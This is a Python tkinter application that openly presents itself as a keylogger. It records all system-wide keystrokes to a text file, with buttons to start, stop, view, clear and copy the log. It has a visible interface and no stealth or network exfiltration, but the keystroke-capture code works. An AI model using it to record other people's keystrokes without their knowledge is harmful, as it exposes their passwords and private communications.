import tkinter as tk
from tkinter import messagebox, filedialog
import keyboard
import threading
import os

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("400x300")

        self.log_file = "keylog.txt"
        self.is_logging = False

        self.label = tk.Label(root, text="Keylogger", font=("Arial", 16))
        self.label.pack(pady=10)

        self.start_button = tk.Button(root, text="Start Logging", command=self.start_logging)
        self.start_button.pack(pady=5)

        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        self.select_file_button = tk.Button(root, text="Select Log File", command=self.select_log_file)
        self.select_file_button.pack(pady=5)

        self.clear_log_button = tk.Button(root, text="Clear Log", command=self.clear_log)
        self.clear_log_button.pack(pady=5)

        self.copy_log_button = tk.Button(root, text="Copy Log to Clipboard", command=self.copy_log)
        self.copy_log_button.pack(pady=5)

        self.log_display = tk.Text(root, height=10, width=50, state=tk.DISABLED)
        self.log_display.pack(pady=10)

        self.exit_button = tk.Button(root, text="Exit", command=self.exit_app)
        self.exit_button.pack(pady=5)

    def start_logging(self):
        self.is_logging = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        messagebox.showinfo("Info", "Keylogger started. Press 'Esc' to stop logging.")
        threading.Thread(target=self.log_keys, daemon=True).start()

    def stop_logging(self):
        self.is_logging = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        messagebox.showinfo("Info", "Keylogger stopped. Logs saved to the selected file.")
        self.update_log_display()

    def log_keys(self):
        with open(self.log_file, "a") as f:
            while self.is_logging:
                key_event = keyboard.read_event()
                if key_event.event_type == keyboard.KEY_DOWN:
                    if key_event.name == "esc":
                        self.stop_logging()
                        break
                    f.write(f"{key_event.name}\n")
                    self.update_log_display()

    def update_log_display(self):
        with open(self.log_file, "r") as f:
            logs = f.read()
        self.log_display.config(state=tk.NORMAL)
        self.log_display.delete(1.0, tk.END)
        self.log_display.insert(tk.END, logs)
        self.log_display.config(state=tk.DISABLED)

    def select_log_file(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            self.log_file = file_path
            messagebox.showinfo("Info", f"Log file set to: {self.log_file}")

    def clear_log(self):
        with open(self.log_file, "w") as f:
            f.write("")
        self.update_log_display()
        messagebox.showinfo("Info", "Log cleared.")

    def copy_log(self):
        with open(self.log_file, "r") as f:
            logs = f.read()
        self.root.clipboard_clear()
        self.root.clipboard_append(logs)
        messagebox.showinfo("Info", "Log copied to clipboard.")

    def exit_app(self):
        if self.is_logging:
            self.stop_logging()
        self.root.quit()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
